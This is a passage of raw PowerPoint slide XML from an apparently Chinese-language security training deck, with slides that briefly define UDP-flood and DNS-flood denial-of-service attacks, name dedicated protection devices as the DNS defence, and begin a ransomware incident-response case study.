            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1115616" y="1525562"/>
            <a:ext cx="2400362" cy="426093"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>UDP-Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击：</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1158383" y="1951684"/>
            <a:ext cx="7045706" cy="628185"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>此种攻击由攻击主机向目标主机未开放端口发送大量</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1477" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>udp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>数据包，目标主机直接丢弃，并回复</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1477" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>icmp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>不可达信息，消耗目标主机资源：</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1477" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1129125" y="3432396"/>
            <a:ext cx="6979237" cy="628185"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>还有一种情况就是攻击主机向目标主机的开放端口发送大量畸形</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1477" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>udp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>数据包，目标主机直接丢弃，消耗目标主机资源。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14129202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29699"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29699"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29699"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29699"/>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0-#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29700"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29700"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29700"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29700"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="26" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="2000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="27" presetID="2" presetClass="entr" presetSubtype="4" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="29698"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="29" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29698"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="30" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="296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5" grpId="0"/>
      <p:bldP spid="6"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2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1086009" y="3694876"/>
            <a:ext cx="6231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defRPr kumimoji="1" b="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>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r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>此攻击的处理思路，是使用专用防护设备对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务进行防护。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="307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948" y="2927084"/>
            <a:ext cx="6231548" cy="60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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CBF65E2-07B1-D744-81E0-9ACE251E61C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="716802" y="1036145"/>
            <a:ext cx="6012473" cy="483031"/>
          </a:xfrm>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DDOS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>事件处理</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" sz="2585" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1013940" y="1648827"/>
            <a:ext cx="2385565" cy="426093"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DNS-Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击：</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1013941" y="2204601"/>
            <a:ext cx="6899988" cy="628185"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>此种攻击为攻击主机向目标主机短时间内发送大量的标准</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>请求，使得目标主机无法正常处理，导致</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1477" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>服务缓慢。</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1477"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97989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30725"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30725"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30725"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30725"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>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30722"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="18" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30722"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="307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5"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A9D9B8-7F69-BE45-B2D0-58C27E1394EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568"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 name="文本框 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{711ADB4B-E5C3-5649-A263-EFAA0F7D7C9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="2208645"/>
            <a:ext cx="7850981" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>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r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>    某日</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>接到应急响应请求：某外网服务器中敲诈者病毒。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584" y="1671559"/>
            <a:ext cx="2202847" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>）事件概述</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="971600" y="3573016"/>
            <a:ext cx="7560840" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr>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pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应急</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>响应人员到场了解情况后，发现服务器中植入勒索病毒，导致全盘文件被加密为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>java</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>后缀格式文件，所有应用均无法使用。发现系统所有文件被加密为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>java</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>后缀文件；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="833996" y="2919382"/>
            <a:ext cx="2196435" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
